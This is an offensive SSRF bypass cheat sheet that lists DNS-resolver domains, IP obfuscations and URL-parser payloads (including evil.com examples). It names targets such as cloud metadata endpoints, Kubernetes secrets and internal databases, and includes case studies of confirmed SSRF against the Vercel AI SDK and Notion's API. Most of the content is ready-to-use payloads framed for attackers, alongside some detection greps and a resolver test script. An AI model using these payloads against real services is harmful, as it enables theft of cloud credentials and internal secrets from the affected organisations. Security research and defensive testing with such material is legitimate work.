# SSRF DNS Bypass Techniques

A comprehensive catalog of DNS-based SSRF bypass techniques. Use these when you find a URL validation function that checks hostname strings but never resolves DNS.

## DNS-Resolver Bypass Domains

These domains are managed by community projects that resolve wildcard subdomains to arbitrary IP addresses embedded in the subdomain.

| Domain | Owner | Arbitrary IP Embedding | Example |
|--------|-------|----------------------|---------|
| `*.nip.io` | nip.io | `{IP with dots}.nip.io` → `{IP}` | `169.254.169.254.nip.io` → `169.254.169.254` |
| `*.sslip.io` | sslip.io | Same pattern, independently maintained | `10.0.0.1.sslip.io` → `10.0.0.1` |
| `*.xip.io` | xip.io (archived) | Same pattern, may be unreliable | (legacy, often slow) |
| `localtest.me` | localtest.me | Fixed: `127.0.0.1` (and `::1`) | `http://localtest.me:52589/` |
| `lvh.me` | lvh.me | Fixed: `127.0.0.1` | `http://lvh.me/` |

### IPv6 Variants

Some validators check IPv4 blocklists but forget IPv6:

| Domain | Resolves To | IPv6 Form |
|--------|-------------|-----------|
| `localtest.me` AAAA | `::1` | IPv6 localhost |
| `ip6-localhost.nip.io` | `::1` | Via nip.io IPv6 |
| `v6.nip.io` | Various | Test separately |

## IP Obfuscation Techniques

When the validator parses resolved IPs (not just hostname strings), try obfuscating the IP:

### Decimal IP
```python
# 169.254.169.254 = 2852039166
http://2852039166/
```

### Hex IP
```python
# 127.0.0.1 = 0x7f000001
# 169.254.169.254 = 0xa9fea9fe
http://0xa9fea9fe/
```

### Octal IP
```python
# 127.0.0.1 = 0177.0.0.1
# 10.0.0.1 = 012.0.0.1
http://012.0.0.1/
```

### Mixed Notation
```python
# 169.254.169.254 → decimal.octal.hex.dotted
# (RFC 3986 allows mixed)
http://2852039166.0252.0xa9fe.254/
```

### CGNAT Bypass (`100.64.0.0/10`)

The Carrier-Grade NAT range is frequently missed by RFC 1918-only blocklists.

```python
http://100.64.0.1:443/    # CGNAT range — often not blocked
```

### IPv4-Mapped IPv6
```python
# ::ffff:127.0.0.1
http://[::ffff:127.0.0.1]:80/
http://[::ffff:169.254.169.254]:80/
```

### IPv6 Short Form
```python
# ::1 = localhost
http://[::1]:80/
```
### DNS Rebinding TOCTOU (Latest Technique)

This bypasses UrlBlocker-style protection that checks the IP at validation time but doesn't pin DNS resolution. The domain resolves to a public IP first (passes the blocklist), then switches to a private IP during the actual HTTP request.

**How it works:**
1. Application resolves DNS → gets public IP (1.2.3.4) → passes blocklist
2. Application makes HTTP request → DNS resolves again → returns 169.254.169.254 (TTL expired, record changed)
3. TOCTOU gap: blocklist checked against Resolve #1, connection uses Resolve #2

**Services:**
| Service | Notes |
|---------|-------|
| `lock.cmpxchg.io` | Starts with your IP, switches to target after configurable delay |
| `1r.mk` | Free TOCTOU rebinding, no registration |
| `rebind.it` | Configurable A/AAAA records that alternate |

**Testing:**
```bash
# If app pins DNS, fast redirect to internal IP fails
# If app re-resolves, TOCTOU works. Test both phases separately.
```

## Bypass Targets by Environment

### AWS
```python
# Metadata endpoint
http://169.254.169.254.nip.io/latest/meta-data/
# IMDSv2 requires PUT with token
http://169.254.169.254.nip.io/latest/api/token
```

### GCP
```python
# Metadata endpoint (requires Metadata-Flavor: Google header)
http://metadata.google.internal/
http://169.254.169.254.nip.io/computeMetadata/v1/
```

### Azure
```python
# Instance Metadata Service
http://169.254.169.254.nip.io/metadata/instance?api-version=2021-02-01
```

### Docker / Kubernetes
```python
# Docker socket (if mounted in container)
http://localhost:2375/version
http://localtest.me:2375/version

# Kubernetes internal DNS
http://kubernetes.default.svc.cluster.local:443/api/v1/namespaces/default/secrets
```

### Generic Internal Services
```python
# Redis (no auth by default)
http://localtest.me:6379/

# MySQL
http://localtest.me:3306/

# Postgres
http://localtest.me:5432/

# Elasticsearch
http://localtest.me:9200/

# Memcached
http://localtest.me:11211/
```

## URL Parser Differential Exploitation

Different URL parsers interpret the same URL differently. Exploit discrepancies between the validator's parser and the HTTP client's parser.

### Backslash as Separator
```python
# curl treats \ as /
http://evil.com\@127.0.0.1/  # curl connects to 127.0.0.1
```

### Credential Confusion
```python
# Different parsers handle @ differently
http://127.0.0.1#@evil.com/  # one parser sees evil.com, another sees 127.0.0.1
http://evil.com:password@127.0.0.1@evil.com/
```

### Unusual Port Positioning
```python
http://127.0.0.1:80@evil.com/  # parser confusion
```

### Newline Injection
```python
# If hostname is interpolated into a request line, inject CRLF
http://127.0.0.1%0d%0aHost:%20internal-service/
```

## Redirect-Based Bypass (No DNS Needed)

When the target follows redirects, you don't need DNS at all:

1. **Set up a redirect chain**: `your-server.com/redirect` → `Location: http://127.0.0.1/`
2. **Submit the initial URL** to the target. Their validation checks `your-server.com` (passes), then follows the redirect to `127.0.0.1` without re-validating.
3. **Use URL shorteners**: `bit.ly/shortcode` → `http://169.254.169.254/latest/meta-data/`

## Detection Heuristics

How to find SSRF-vulnerable code in static analysis:

```bash
# Pattern 1: URL validation on hostname string only
grep -rn "is-localhost\|isPrivate\|blockedIps\|restricted" packages/ --include='*.ts'
# If they check hostname against a list but never call dns.lookup/resolve4 — vulnerable

# Pattern 2: fetch() with user-supplied URLs
grep -rn "fetch(" packages/ --include='*.ts' | grep -v '.test.' | grep -v node_modules

# Pattern 3: Third-party URL import features
# File uploads, embed blocks, link previews, URL unfurling, OGP scraping
```

## Case Studies

### Case Study: Vercel AI SDK SSRF (Confirmed)

**Target**: `@ai-sdk/provider-utils` v5.0.0-canary.44
**File**: `packages/provider-utils/src/validate-download-url.ts`
**Result**: 8/8 bypass URLs passed validation
**Impact**: High — cloud metadata exfiltration (AWS, GCP, Azure), internal network scanning

The function blocks literal private IPs and known localhost names, but **never resolves DNS**. All DNS-resolver domains pass, including `169.254.169.254.nip.io` which triggers AWS metadata SSRF.

**See also**: `packages/ai/src/util/download/download.ts` (caller), `packages/ai/src/prompt/convert-to-language-model-prompt.ts` (entry point for user-provided file URLs)

### Case Study: Notion API SSRF (Confirmed, Two Vectors)

**Target**: Notion Labs — `api.notion.com`
**Date**: 2026-05-30
**Result**: 2 SSRF vectors confirmed, 7+ internal IP URLs accepted

**Vector 1: Embed/Bookmark Block URL Injection (HTTP + HTTPS)**
- **API**: `PATCH /v1/blocks/{id}/children` with `type: embed` or `type: bookmark`
- **URL validation**: None — `http://localtest.me/`, `http://169.254.169.254.nip.io/` all accepted
- **Block types affected**: embed, bookmark, image, video, audio, file
- **Fetcher services**: NotionEmbedder (HEAD, IP `131.149.232.x`) + Iframely/1.3.1 (GET, IP `44.199.21.82` / `54.162.72.45`)
- **Confirmed via**: Webhook.site — 14+ requests received from Notion's infrastructure

**Vector 2: File Upload External URL (HTTPS only)**
- **API**: `POST /v1/file_uploads` with `mode: external_url`
- **URL validation**: HTTPS URLs only, but no private IP checking
- **Fetcher services**: notion-api (HEAD, IP `131.149.232.x`) + notion (GET, IP `131.149.232.x`)
- **File import**: Status changed from `pending` to `uploaded` — content was fetched and stored

| Service | User-Agent | Method | IP(s) | Trigger |
|---------|-----------|--------|-------|---------|
| NotionEmbedder | `NotionEmbedder` | HEAD | `131.149.232.139/.151/.198/.214` | Embed/bookmark |
| notion-api | `notion-api` | HEAD | `131.149.232.152/.204` | File upload |
| notion | `notion` | GET | `131.149.232.136/.138` | File upload |
| Iframely | `Iframely/1.3.1` | GET | `44.199.21.82`, `44.194.139.157`, `52.2.214.255`, `54.162.72.45`, `100.29.130.36` | Embed/bookmark |

## Testing Script (Python)

```python
import urllib.request
import json

# Test DNS bypass domains against a target endpoint
domains = [
    "http://localtest.me/",
    "http://lvh.me/",
    "http://127.0.0.1.nip.io/",
    "http://169.254.169.254.nip.io/latest/meta-data/",
    "http://10.0.0.1.sslip.io/",
    "http://[::ffff:127.0.0.1]/",
]

# Resolve each domain first
import socket
for d in domains:
    host = urllib.parse.urlparse(d).hostname
    try:
        ip = socket.getaddrinfo(host, 80)[0][4][0]
        print(f"  {d[:50]:50s} → {ip}")
    except Exception as e:
        print(f"  {d[:50]:50s} → FAIL: {e}")
```
